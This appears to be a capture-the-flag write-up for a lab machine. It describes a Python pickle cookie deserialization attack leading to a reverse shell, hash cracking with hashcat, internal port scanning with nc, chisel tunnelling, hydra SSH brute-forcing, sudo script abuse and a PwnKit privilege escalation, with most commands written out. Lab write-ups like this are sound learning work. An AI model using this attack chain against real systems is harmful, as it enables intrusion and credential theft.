Started with a nmap scan
```
5003 filemaker WSGIServer 0.2 CPython 3.8.6
```
Webserver is using `Set-Cookie` and setting the whole `csrf` token 
Can make admin account but when going to the admin page says we do not have permission
under the share section we can upload images
Gobuster scan some paths are in the code but don't exist 
```
/admin/login
/about
/share
/accounts/login
/account/profile
```
possible usernames 
```
ramsey
wan
oliver
```
When going to the search section of the website we sets a cookie for are search term and we can use python pickle to decode it and encode a reverse shell or just to see if it will ping us back we can get a ping back so lets go for a reverse shell need to use a get request and change the revshell to `/bin/sh` now we have access to the server as `root` but looks like were in a docker container so we need to escape for it looking around the server we find a db `db.sqlite3` and there some users in there we can try to crack the hashes and while that's going we can check for open ports
`nc -zV 172.17.0.1 1-65535`
`hashcat -m 10000 hash rockyou.txt` 
One users got cracked `testing:la....5` 
From are host enumeration eailer we could see ssh was open on the internal host using a old version of `chisel` on are host we run and when we run it need to have same version on both machines
`sudo chisel server -p 1880 --reverse` 
On server 
`./chisel client 10.13.8.255:1880 R:22:172.17.0.1:22`
But the login does not work and we did not find anything to hint to the only user on the box `ramsey` so were going to try and crack it with hydra and we got the password pretty quickly
`ramsey:123....8` 
And now we have access to the ssh server and the user.txt running `sudo -l` we can run the vuln.py script as `oliver` we can change the name of this script and then make a new one then put a reverse shell and run the script with sudo
`sudo -u oliver /usr/bin/python /home/ramsey/vuln.py` and start a listener on are host and now we are oliver now to get root to the host machine I ran linpeas and found its vuln to PwnKit so I just used that 